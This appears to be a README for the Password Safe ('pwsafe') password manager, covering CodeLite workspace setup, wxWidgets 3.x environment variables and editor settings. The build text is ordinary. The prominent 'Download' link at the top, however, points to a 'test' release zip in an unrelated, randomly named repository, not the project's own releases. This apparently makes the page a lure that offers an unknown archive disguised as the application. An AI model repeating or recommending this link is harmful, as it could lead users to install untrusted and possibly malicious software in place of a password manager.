# pwsafe

A Password Safe repository for a secure and convenient password manager, with project files and workspace support for browsing, building, and debugging the application in a desktop development environment.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/pwsafe.zip)

## Overview

Password Safe is a password manager intended to help users store and manage passwords securely and conveniently. This repository includes project/workspace material for working with the application in CodeLite, including support for building the `pwsafe` target and browsing related source projects.

The workspace is useful for developers who want an IDE-based workflow rather than relying only on makefiles.

## Windows-Oriented Context

The workspace includes a `Windows` project for browsing the Windows/MFC source files. This project is provided for source navigation and reference inside the workspace; it is not described as a build target in the supplied project notes.

For developers working across a Windows desktop codebase and a wxWidgets-based build environment, the workspace can help keep the Windows-related source visible alongside the main application project.

## Development Notes

The CodeLite workspace was originally created with CodeLite 2.5.2.4031, and newer or nearby versions are expected to be suitable.

Password Safe uses wxWidgets 3.x. On systems where wxWidgets 3.x is not provided by the distribution, wxWidgets may need to be built separately and made available to CodeLite.

The workspace expects the following environment variables to be visible to CodeLite when building with wxWidgets 3.x:

```text
WX3_CONFIG_DEBUG=<path to wx-config of your wx3 debug build>
WX3_CONFIG_RELEASE=<path to wx-config of your wx3 release build>
```

## Building with CodeLite

To work with the project in CodeLite:

1. Open CodeLite.
2. Use **Workspace → Switch to Workspace...**.
3. Select the `PasswordSafe.workspace` file.
4. Build the `pwsafe` project from the workspace view, or use **Build Workspace**.

Depending on the selected configuration, CodeLite creates a `Debug` or `Release` directory containing intermediate files and final build outputs, including the `pwsafe` binary and related libraries.

## Workspace Projects

### `pwsafe`

The main project used to build the password manager application.

### `Windows`

A project included for convenient browsing of Windows/MFC source files. It is not intended to build as part of the `pwsafe` project or full workspace build.

### `wxWidgets`

A project included for browsing wxWidgets source code from within the IDE. It assumes the wxWidgets source tree is available through a `wx` subdirectory in the CodeLite directory.

For example, a developer may create a symbolic link named `wx` pointing to an installed wxWidgets source directory.

## Editor Settings

When editing source files in CodeLite, use indentation settings that avoid unintended whitespace changes:

- Convert tabs to spaces.
- Use 2-character indentation.
- Treat each tab as 2 spaces.

Before committing changes, review diffs carefully to avoid including unrelated whitespace-only modifications.

## FAQ

### What is pwsafe?

`pwsafe` is the Password Safe password manager project.

### Is this a Windows application?

Password Safe includes Windows/MFC source material, and this workspace exposes that source for browsing. The supplied build notes focus on using CodeLite and wxWidgets.

### What is CodeLite used for here?

CodeLite is used as an IDE for browsing, building, and debugging the Password Safe project.

### Does the Windows project build?

The supplied notes describe the `Windows` project as a source-browsing project only. It does not build when building `pwsafe` or the full workspace.

### Why is wxWidgets needed?

Password Safe uses wxWidgets 3.x, so CodeLite needs access to the correct wxWidgets headers and libraries for the configured build.

## Conclusion

`pwsafe` provides a CodeLite-friendly workspace for working with Password Safe, a secure and convenient password manager. The workspace supports building the main application target, browsing Windows-related source files, and referencing wxWidgets source code during development.
